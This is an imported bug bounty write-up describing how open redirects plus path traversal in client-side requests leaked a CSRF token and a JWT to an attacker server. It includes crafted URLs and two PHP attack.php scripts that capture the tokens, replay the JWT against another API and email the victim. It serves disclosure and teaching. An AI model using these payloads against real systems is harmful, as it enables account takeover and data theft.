---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-05-15_you-do-not-need-to-run-80-reconnaissance-tools-to-get-access-to-user-accounts.md
original_filename: 2019-05-15_you-do-not-need-to-run-80-reconnaissance-tools-to-get-access-to-user-accounts.md
title: You do not need to run 80 reconnaissance tools to get access to user accounts
category: documents
detected_topics:
- cors
- jwt
- access-control
- command-injection
- otp
- automation-abuse
tags:
- imported
- documents
- cors
- jwt
- access-control
- command-injection
- otp
- automation-abuse
language: en
raw_sha256: bdbecb5a89a9bcb3a5812b6bcc3d240bcfbb9c900cbb8907ac6a5386d9ed5c99
text_sha256: bed4cb98cd752d62f248609efaf82d3c5623b1b32e4938207114395f302e0d97
ingested_at: '2026-06-28T07:31:59Z'
sensitivity: unknown
redactions_applied: true
---

# You do not need to run 80 reconnaissance tools to get access to user accounts

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-05-15_you-do-not-need-to-run-80-reconnaissance-tools-to-get-access-to-user-accounts.md
- Source Type: markdown
- Detected Topics: cors, jwt, access-control, command-injection, otp, automation-abuse
- Ingested At: 2026-06-28T07:31:59Z
- Redactions Applied: True
- Raw SHA256: `bdbecb5a89a9bcb3a5812b6bcc3d240bcfbb9c900cbb8907ac6a5386d9ed5c99`
- Text SHA256: `bed4cb98cd752d62f248609efaf82d3c5623b1b32e4938207114395f302e0d97`


## Content

---
title: "You do not need to run 80 reconnaissance tools to get access to user accounts"
page_title: "csrf_jwt_redirect_leak.md · GitHub"
url: "https://gist.github.com/stefanocoding/8cdc8acf5253725992432dedb1c9c781"
final_url: "https://gist.github.com/stefanocoding/8cdc8acf5253725992432dedb1c9c781"
authors: ["Stefano Vettorazzi (@stefanohablando)"]
bugs: ["Open redirect"]
publication_date: "2019-05-15"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5262
---

## You do not need to run 80 reconnaissance tools to get access to user accounts

An open redirect was almost everything I needed in two different bug bounty programs to get access to user accounts. In one of the cases a [JWT](https://jwt.io/introduction/) was leaked, and in the other the [CSRF token](https://en.wikipedia.org/wiki/Cross-site_request_forgery#Prevention) was leaked. The issue was mostly the same in both cases: not validating, or URI encoding, user input in the client-side, and sending sensitive information to my server using an open redirect.

#### CSRF token bug

  1. There is an open redirect on <https://example.com/redirect?url=https://myserver.com/attack.php>
  2. User loads <https://example.com/?code=VALUE>
  3. Javascript code in <https://example.com/> makes a GET request to <https://example.com/verify/VALUE> with a header `x-csrf-token` set to the CSRF token for the session of the user 
  
  GET /verify/VALUE HTTP/1.1
  Host: example.com
  x-csrf-token: the-csrf-token-of-the-user
  ...
  
  

  4. The issue is that if the user loads <https://example.com/?code=../redirect%3furl%3dhttps://myserver.com/attack.php>, the application makes the GET request of step 3 to <https://example.com/redirect?url=https://myserver.com/attack.php>, follows the redirection, and the `x-csrf-token` ends up being sent in a GET request to <https://myserver.com/attack.php>
  5. **attack.php** stores the value of `x-csrf-token` or does anything that is necessary for the attack 
  
  <?php
  // These headers are specific to this request.
  // Open your web browser Console whenever you are testing a similar issue
  // to check if there is any CORS issues that you have to fix in your response.
  header('Access-Control-Allow-Origin: *');
  header('Access-Control-Allow-Headers: x-requested-with,x-csrf-token');
  
  foreach (getallheaders() as $key => $value) {
  if ($key == 'x-csrf-token') {
  $token_file = fopen('csrf_token.txt', 'w');
  fwrite($token_file, $value);
  fclose($token_file);
  }
  }
  ?>

For my proof of concept, I took the value of `x-csrf-token` and made changes to the profile of the user/victim on <https://example.com>.

#### JWT bug

  1. There is an open redirect on <https://api.example.com/redirect?reference=xxxx-xxxx-xxxx-xxxx>. This open redirect was different because first I had to make a request to another endpoint with the URL to which I wanted to redirect, and the "reference" value was returned in the response. Once I had that reference value, any request to <https://api.example.com/redirect?reference=reference-value> by any user, redirected to the URL I had sent in the first request.
  2. User loads <https://example.com/app/VALUE>
  3. Javascript code makes a GET request to <https://api.example.com/check/VALUE/please> with the header `Authorization` set to `Bearer ***REDACTED***`
  
  GET /check/VALUE/please HTTP/1.1
  Host: api.example.com
  Authorization: Bearer ***REDACTED***
  ...
  
  

  4. The issue is that the attacker can create a redirect to <https://myserver.com/attack.php>, and when the user loads <https://example.com/app/..%2fredirect%3freference%3dx-x-x-x%26> (`%26` is equal to `&` once decoded, which was necessary to remove "/please" from the value of "reference"), the application makes a GET request to <https://api.example.com/redirect?reference=x-x-x-x> which redirects to <https://myserver.com/attack.php> with the JWT in the `Authorization` header
  5. **attack.php** stores the JWT or does anything that is possible with it 
  
  <?php
  header('Access-Control-Allow-Origin: *');
  header('Access-Control-Allow-Headers: authorization');
  
  foreach (getallheaders() as $key => $value) {
  if ($key == 'Authorization') {
  $opts = array(
  'http'=>array(
  'method'=>'GET',
  'header'=>'Authorization: '.$value
  )
  );
  $context = stream_context_create($opts);
  $file = file_get_contents('https://other-api.example.com/info', false, $context);
  $fh = fopen('out.txt', 'w');
  fwrite($fh, $file);
  fclose($fh);
  $json = json_decode($file, true);
  $sent = mail($json['email'], 'Hi '.$json['name'], 'Your user id is '.$json['id'], 'From: attacker@myserver.com');
  if ($sent) {
  echo 'Email sent';
  } else {
  echo 'Couldn\'t send email';
  }
  }
  }
  ?>

For my proof of concept, I took the JWT, got information about the user/victim from other API which accepted the same JWT in the `Authorization` header, and sent an email to the user/victim. The previous code is exactly what I used as proof of concept.

### End

It is been a long time since I shared something that could be useful for new bug bounty hunters, I hope it is useful.
